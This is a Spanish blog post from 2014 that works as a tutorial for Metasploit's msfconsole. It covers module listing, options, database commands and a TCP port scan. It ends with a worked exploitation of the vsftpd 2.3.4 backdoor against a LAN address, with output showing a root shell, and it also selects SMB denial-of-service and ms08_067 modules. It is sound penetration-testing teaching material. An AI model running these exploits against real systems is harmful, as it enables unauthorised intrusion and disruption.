---
layout: post
title: "msfconsole"
date: 2014-01-28 17:51
comments: true
categories: 
---
[metasploit]. Consola centralizada con acceso a todo las opciones disponibles de Metasploit Framework, única soportada y estable con soporte para de edición de lineas (readline), que permite tabulacion y ejecución de comandos externos.

Uso de comandos externos: Lanzar un ping a un equipo o nmap:

	msf > ping -c 1 192.168.1.10

	msf > nmap 192.168.1.10

Obtener ayuda:

	msf > help

Mostrar módulos disponibles:

	msf > show

Mostrar módulos auxiliares [scanners, modulos de denial of service, fuzzers...]:

	msf > show auxiliary

Obtener una lista de todos los exploits:

	msf > show exploits

Mostrar listado de los diferentes payloads y para las plataformas disponibles:

	msf > show payloads

Nota.- Cuando se está usando un determinado exploit, "show payloads" solo mostrará los que son compatibles para ese exploit concreto. 

Seleccionado un módulo especifico, para mostrar las opciones disponibles y/o requeridas para ese módulo concreto.

	msf exploit(ms08_067_netapi) > show options

Mostrar objetivos soportados:

	msf exploit(ms08_067_netapi) > show targets

Mostrar las opciones avanzadas de un exploit:

	msf exploit(ms08_067_netapi) > show advanced

Buscar cadenas de texto dentro del módulo

	msf > search ms09-001

Buscar información detallada [opciones, objetivos....] sobre un determinado modulo

	msf > info dos/windows/smb/ms09_001_write

Una vez escogido el módulo en particular, seleccionarlo con:

	msf > use dos/windows/smb/ms09_001_write

Y mirar sus opciones requeridas:

	msf auxiliary(ms09_001_write) > show options

Conectar a una Ip y a un puerto:

	msf > connect 192.168.1.10 23

Para configurar las opciones del modulo que se está utilizando:

	msf auxiliary(ms09_001_write) > set RHOST 192.168.1.10

Comprobar de nuevo las opciones del módulo

	msf auxiliary(ms09_001_write) > show options

Mostrar codificaciones disponibles:

	msf exploit(ms08_067_netapi) > show encoders

Escoger la deseada:

	msf exploit(ms08_067_netapi) > set encoder x86/shikata_ga_nai

Comprobar si un objetivo es vulnerable a un exploit sin explotar la vulnerabilidad:

	msf exploit(ms04_045_wins) > check

Para establecer una variable global [setg - save]:

	msf > setg RHOST 192.168.1.136

	RHOST => 192.168.1.136

	msf > save

	Saved configuration to: /root/.msf3/config

Suprimir una variable global:

	msf > unsetg RHOST

Suprimir una variable entrada para un módulo:

	msf > unset RHOST

Lanzar un exploit:

	msf auxiliary(ms09_001_write) > run

Salir del módulo:

	msf auxiliary(ms09_001_write) > back

Cambiar al modo de edición de scripts en ruby:

	msf > irb

1.-

Algunos comandos relacionados con la base de datos propia de metasploit:

	msf > db_status (Mostrar el estado de la conexión a la BDs y nombre)

	msf > db_nmap 192.168.1.10 (Lanzar nmap y guardar el resultado en la BDs)

	msf > hosts (Muestra todos los informes de la BDs)

	msf > hosts 192.168.1.10 (Muestra sólo el informe de la ip especificada)

	msf > services (Muestra todos los servicios de la BDs incluso los inactivos)

	msf > services -u -R 192.168.1.10 (Muestra los servicios activos [u] del host especificado [R])

2.-

Muestra de un scan de puertos:

	Exploradores de puertos disponibles:

		msf > search portscan

	Nota.- Los escáners y la mayoría de módulos auxiliares usan la opción RHOSTS en vez de RHOST y puede ser un rango de IP [192.168.1.10-192.168.1.50], rangos CIDR (192.168.1.0/24), múltiples rangos separados por comas (192.168.1.0/24, 192.168.3.0/24) y una lista en un archivo con una ip por linea (file:/tmp/hostlist.txt). 

	Para escoger el escaneador de puertos a usar:

		msf > use scanner/portscan/tcp

	Comprobar si falta algún parámetro [RHOSTS]

		msf auxiliary(tcp) > show options

	Entrar la ip donde dirigir el escaneo:

		msf auxiliary(tcp) > set RHOSTS 192.168.1.10

	Arancar el escaneo:

		msf auxiliary(tcp) > run

Todos los módulos scanner tiene el valor THREADS en "1". Este valor establece el número de subprocesos simultaneos que se utilizan durante la exploración. Un número superior acelera las exploraciones pero aumenta el tráfico en la red. Para modificar el valor:

	msf > set THREADS 50

3.-

Muestra de un ataque

MSF > use exploit/unix/ftp/vsftpd_234_backdoor

Comprobar parámetros que faltan:

	msf exploit(vsftpd_234_backdoor) > show options

Entrar el parámetro RHOST [la IP atacada]

	msf exploit(vsftpd_234_backdoor) > set RHOST 192.168.1.10

Comprobar nuevamente si el parámetro ha entrado correctamente:

	msf exploit(vsftpd_234_backdoor) > show options

Lanzar el exploit en segundo plano [j] y mostrando una salida positiva en la que se abre una shell en la máquina remota:

	msf exploit(vsftpd_234_backdoor) > exploit -j

	[*] Exploit running as background job.

	[*] Banner: 220 (vsFTPD 2.3.4)

	[*] USERR: 331 Please specify the password.

	msf exploit(vsftpd_234_backdoor) > [+] Backdoor service has been spawned, handling...

	[+] UID: uid=0(root) gid=0(root)

	[*] Found shell.

	[*] Command shell session 1 opened (192.168.1.15:49654 -> 192.168.1.10:6200) at 2013-07-07 08:06:30 -0400

Mostrar las sesiones abiertas [ID de la sesion, puertos abiertos, máquina remota, local...]:

	msf exploit(vsftpd_234_backdoor) > sessions -l

Ejecutar un comando en todas las shells abiertas y mostradas con sessions -l:

	msf exploit(vsftpd_234_backdoor) > sessions -c ifconfig 

Entrar en la session con ID 1:

	msf exploit(vsftpd_234_backdoor) > sessions -i 1

	[*] Starting interaction with 1...

A partir de este punto estamos en una shell clásica de linux del host 192.168.1.10 donde podemos usar todos los comandos propios de dichas shells.

